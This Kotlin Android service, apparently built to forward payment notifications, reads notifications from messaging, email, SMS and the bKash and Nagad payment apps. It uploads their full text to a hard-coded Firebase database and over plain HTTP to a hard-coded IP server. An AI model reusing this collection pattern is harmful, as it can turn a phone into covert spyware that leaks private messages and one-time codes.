package me.kzaman.notification_forwarder.services


import android.R.attr
import android.app.Notification
import android.content.Intent
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.android.volley.AuthFailureError
import com.android.volley.Response
import com.android.volley.VolleyLog
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import com.google.firebase.database.FirebaseDatabase
import java.time.LocalDateTime
import java.time.format.DateTimeFormatter


class ApplicationNotificationListener : NotificationListenerService() {

    companion object {
        const val FACEBOOK_PACK_NAME = "com.facebook.katana"
        const val FACEBOOK_MESSENGER_PACK_NAME = "com.facebook.orca"
        const val WHATSAPP_PACK_NAME = "com.whatsapp"
        const val INSTAGRAM_PACK_NAME = "com.instagram.android"
        const val GMAIL_PACK_NAME = "com.google.android.gm"
        const val NAGAD_PACK_NAME = "com.konasl.nagad"
        const val BKASH_PACK_NAME = "com.bkash.customerapp"
        const val MESSAGE_PACK_NAME = "com.samsung.android.messaging"

        const val FACEBOOK_CODE = 1
        const val FACEBOOK_MESSENGER_CODE = 2
        const val WHATSAPP_CODE = 3
        const val INSTAGRAM_CODE = 4
        const val GMAIL_CODE = 5
        const val NAGAD_CODE = 6
        const val BKASH_CODE = 7
        const val MESSAGE_CODE = 8
        const val OTHER_NOTIFICATIONS_CODE = 10 // We ignore all notification with code == 10

    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {

        val packageName = sbn!!.packageName
        val notificationCode = matchNotificationCode(sbn)

        val intent = Intent("me.kzaman.notification_forwarder")
        intent.putExtra("Notification Code", notificationCode)

        val mNotification: Notification = sbn.notification
        val extras: Bundle = mNotification.extras
        val androidTitle = extras.getString("android.title").toString()
        val androidText = extras.getString("android.text").toString()
        val androidSubText = extras.getString("android.subText").toString()
        val androidBigText = extras.getString("android.bigText").toString()
        val androidInfoText = extras.getString("android.infoText").toString()

        val applicationInfo = applicationContext.packageManager.getApplicationInfo(packageName, 0)
        val appName = applicationInfo.loadLabel(applicationContext.packageManager).toString()

        Log.d("Notification title", androidTitle)
        Log.d("Notification text", androidText)

        if (notificationCode != OTHER_NOTIFICATIONS_CODE) {
            val params: MutableMap<String, String> = HashMap()
            params["app_name"] = appName
            params["package_name"] = packageName
            params["android_title"] = androidTitle
            params["android_text"] = androidText
            params["android_sub_text"] = androidSubText
            params["android_big_text"] = androidBigText
            params["android_info_text"] = androidInfoText
            params["transaction_id"] = "722e5bb7b911f444"

            val current = LocalDateTime.now()
            val formatter = DateTimeFormatter.ofPattern("yyyyMMddHHmmss")
            val key = current.format(formatter)
            val database =
                FirebaseDatabase.getInstance("https://notification-forwarder-22-default-rtdb.asia-southeast1.firebasedatabase.app/")
            val notificationRef = database.getReference("notifications")
            notificationRef.child(key).setValue(params)

            sendNotificationPost(params)
            Log.d("d", "Sent broadcast")
            sendBroadcast(intent)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        Log.d("Notification", "Clear Notification")
        val notificationCode = matchNotificationCode(sbn!!)

        if (notificationCode != OTHER_NOTIFICATIONS_CODE) {
            val activeNotifications = this.activeNotifications
            if (activeNotifications != null && activeNotifications.isNotEmpty()) {
                for (i in activeNotifications.indices) {
                    if (notificationCode == matchNotificationCode(activeNotifications[i])) {
                        val intent = Intent("me.kzaman.notification_forwarder")
                        intent.putExtra("Notification Code", notificationCode)
                        sendBroadcast(intent)
                        break
                    }
                }
            }
        }
    }

    private fun matchNotificationCode(sbn: StatusBarNotification): Int {
        return when (sbn.packageName) {
            FACEBOOK_PACK_NAME -> FACEBOOK_CODE
            FACEBOOK_MESSENGER_PACK_NAME -> FACEBOOK_MESSENGER_CODE
            INSTAGRAM_PACK_NAME -> INSTAGRAM_CODE
            WHATSAPP_PACK_NAME -> WHATSAPP_CODE
            GMAIL_PACK_NAME -> GMAIL_CODE
            NAGAD_PACK_NAME -> NAGAD_CODE
            BKASH_PACK_NAME -> BKASH_CODE
            MESSAGE_PACK_NAME -> MESSAGE_CODE
            else -> OTHER_NOTIFICATIONS_CODE
        }
    }

    private fun sendNotificationPost(data: Map<String, String>) {

        val url = "http://203.188.245.58:7011/api/notification-forwarder"

        // Instantiate the RequestQueue.
        Log.d("d", "Got to sendPost")
        val requestQueue = Volley.newRequestQueue(this)
        Log.d("d", "Data: " + attr.data.toString())
        Log.d("d", "Url: $url")


        val jsonObjRequest: StringRequest =
            object : StringRequest(Method.POST, url,
                Response.Listener {
                    Log.d("Response", it.toString())
                }, Response.ErrorListener { error ->
                    VolleyLog.d("volley", "Error: " + error.message)
                    error.printStackTrace()
                }) {
                override fun getBodyContentType(): String {
                    return "application/x-www-form-urlencoded; charset=UTF-8"
                }

                @Throws(AuthFailureError::class)
                override fun getParams(): Map<String, String> {
                    var params: Map<String, String> = HashMap()
                    params = data
                    return params
                }
            }
        requestQueue.add(jsonObjRequest)
    }
}